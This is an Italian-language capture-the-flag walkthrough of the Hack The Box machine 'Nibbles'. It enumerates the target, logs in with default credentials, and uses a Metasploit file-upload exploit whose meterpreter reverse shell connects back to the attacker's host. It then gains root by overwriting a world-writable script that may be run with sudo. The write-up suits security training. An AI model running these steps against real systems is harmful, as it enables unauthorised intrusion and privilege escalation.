---
title: Nibbles Walkthrough
description: "Nibbles è una macchina abbastanza semplice, tuttavia con l'inclusione di una blacklist di login, è decisamente più impegnativo trovare credenziali valide. Fortunatamente, è possibile enumerare un username e indovinare la password corretta non richiede molto tempo per la maggior parte degli utenti."
author: dua2z3rr
date: 2025-11-28 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Vulnerability Assessment", "Area di Interesse: Software & OS exploitation", "Area di Interesse: Security Tools", "Vulnerabilità: Remote Code Execution", "Vulnerabilità: Default Credentials", "Servizio: Nibbleblog", "Tecnica: User Enumeration", "Tecnica: Web Site Structure Discovery", "Tecnica: Brute Force Attack", "Tecnica: SUDO Exploitation"]
image: /assets/img/nibbles/nibbles-resized.png
---

## Enumerazione Esterna

### nmap

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap nibbles.htb -vv -p-
<SNIP>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap nibbles.htb -vv -p22,80 -sC -sV
<SNIP>
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Sito

Andiamo sul sito e troviamo davanti a noi una pagina con scritto `hello world!`.

![Desktop View](/assets/img/nibbles/nibbles-1.png)

Controllando il codice sorgente della pagina trovo un commento che ci da un indizio su dove dobbiamo andare.

![Desktop View](/assets/img/nibbles/nibbles-2.png)

Visitiamo la directory **/nibbleblog/**.

![Desktop View](/assets/img/nibbles/nibbles-3.png)

### ffuf

Nella directory appena scoperta, non troviamo nulla nel codice sorgente e nessun altra pagina che ci reindirizza a qualcosa di utile. Procediamo quindi a fare fuzzing delle directory.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt:FUZZ -u http://nibbles.htb/nibbleblog/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nibbles.htb/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 33ms]
content                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 21ms]
themes                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 19ms]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 19ms]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 19ms]
languages               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 19ms]
                        [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 28ms]
```

Essendo una applicazione php, proviamo ad accedere alla pagina **admin.php**.

![Desktop View](/assets/img/nibbles/nibbles-4.png)

### Default Credentials

Proviamo ad accedere alla admin dashboard tramite le credenziali di default di nibbleblog. Ecco cosa ho trovato cercondole online:

![Desktop View](/assets/img/nibbles/nibbles-5.png)

> Se ottieni un errore riguardante essere sulla blacklist, attendi un paio di minuti e riuscirai ad accedere!
{: .prompt-info }

Alla fine riusciamo ad accedere con le credenziali **admin:nibbles**.

### Admin Dashboard

Analizzando la **admin dashboard**, scopro che possiamo creare delle nuova pagine, includendo anche del codice sorgente. Posso utilizzare del codice **php** per ottenere una reverse shell sull'host della vittima.

![Desktop View](/assets/img/nibbles/nibbles-6.png)

L'upload delle pagine non funziona perchè il codice php non viene formattato correttamente. Allora, vado alla ricerca di un altro punto, d'attacco, i plugin. Scompro che esiste un plugin dove  possiamo fare l'upload di immagini.

Cerco la versione di Nibbleblog andando sulla pagina `http://nibbles.htb/nibbleblog/update.php`. Scopro che  è la versione **4.0.3**.

![Desktop View](/assets/img/nibbles/nibbles-7.png)

### metasploit

Trovo un modulo di metasploit per la vulnerabilità riguardante la versione di **nibbleblog** che ho trovato.

```shell
[msf](Jobs:0 Agents:0) >> search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapni, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set password nibbles
password => nibbles
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set rhost nibbles.htb
rhost => nibbles.htb
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set username admin
username => admin
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set lhost tun0
lhost => 10.10.16.4
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set lport 9001
lport => 9001
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set targeturi /nibbleblog/
targeturi => /nibbleblog/
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> run
[*] Started reverse TCP handler on 10.10.16.4:9001 
[*] Sending stage (40004 bytes) to 10.10.10.75
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.16.4:9001 -> 10.10.10.75:55520) at 2025-11-28 21:14:11 +0100

(Meterpreter 1)(/var/www/html/nibbleblog/content/private/plugins/my_image) > shell
Process 18069 created.
Channel 0 created.
whoami
nibbler
```

Prendiamo la user flag.

## Shell come nibbler

### Enumerazione Interna

Nella home directory trovo una zip.

```shell
ls
personal.zip
user.txt
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

Ecco il contenuto dello script:

```shell
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
```

Chiedendomi come avrei potuto ottenere root con questo script, controllo se posso eseguire dei binaries come sudo.

```shell
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Posso esegguire lo script appena trovato come root.

### Privilege Escalation

Prima di eseguire lo script, controlliamo i permessi che abbiamo su di esso.

```shell
ls -al
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

Posso trascrivere il file mantenendo il privilegio di eseguirlo come root.

```shell
echo "cat /root/root.txt" > monitor.sh
sudo ./monitor.sh
<ROOT SHELL>
```

Terminiamo la box.
